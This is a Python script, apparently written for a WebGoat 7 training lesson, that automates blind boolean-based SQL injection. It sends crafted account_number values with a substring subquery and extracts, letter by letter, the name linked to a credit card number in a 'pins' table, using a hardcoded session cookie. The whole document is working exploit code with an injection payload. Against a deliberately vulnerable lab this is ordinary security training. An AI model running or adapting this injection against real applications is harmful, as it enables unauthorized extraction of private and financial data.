import requests
from bs4 import BeautifulSoup

alphabets = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
url = 'http://webgoat7.com/WebGoat/attack?Screen=1315528047&menu=1100'

cookies = {'JSESSIONID':'CD1E27A32598835D2EE5FED6D0725EAD'}

name = []
 
for i in range(1, 50):
    flag=[]
    for c in alphabets:
        post_data = {'account_number':'101 and (substring((select name from pins where cc_number=\'4321432143214321\'), %d, 1) > \'%c\')'%(i,c), 'SUBMIT':'GO!'}
 
 
        response = requests.post(url, cookies=cookies, data=post_data)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
 
        flag.append(soup.find_all('p')[-1].text)
    
    if 'Account number is valid' not in flag:
        break

    name.append(alphabets[flag.index('Invalid account number')])

print(''.join(name))
